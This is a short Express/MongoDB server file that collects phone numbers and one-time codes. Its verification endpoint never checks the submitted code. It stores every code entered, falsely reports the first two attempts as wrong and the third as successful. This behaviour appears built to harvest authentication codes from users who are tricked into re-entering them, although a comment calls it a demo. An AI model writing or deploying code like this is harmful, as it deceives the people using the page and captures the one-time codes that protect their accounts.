const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const cors = require("cors");
require("dotenv").config();
const User = require("./models/User");

const app = express();
app.use(bodyParser.json());
app.use(cors());
app.use(express.static("public"));

// 👉 Replace with your MongoDB Atlas connection string
mongoose.connect(process.env.MONGO_URL)
  .then(() => console.log("MongoDB connected"))
  .catch(err => console.log(err));


// Step 1: Save number
app.post("/save-number", async (req, res) => {
  const { number } = req.body;

  const user = new User({
    number,
    otp: "1234", // fixed OTP for demo
    attempts: 0
  });

  await user.save();

  res.json({ message: "Number saved", userId: user._id });
});


// Step 2: OTP verification
app.post("/verify-otp", async (req, res) => {
  const { userId, otp } = req.body; // otp = ["1","2","3","4"]

  const user = await User.findById(userId);

  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  // increase attempt count
  user.attempts += 1;

  // store OTP attempt in DB
  user.otpAttempts.push(otp);

  await user.save();

  // ❌ first 2 attempts always fail
  if (user.attempts < 3) {
    return res.json({
      success: false,
      message: "Wrong OTP"
    });
  }

  // ✅ 3rd attempt always success
  return res.json({
    success: true,
    message: "OTP Verified Successfully"
  });
});

app.listen(3000, () => console.log("Server running on port 3000"));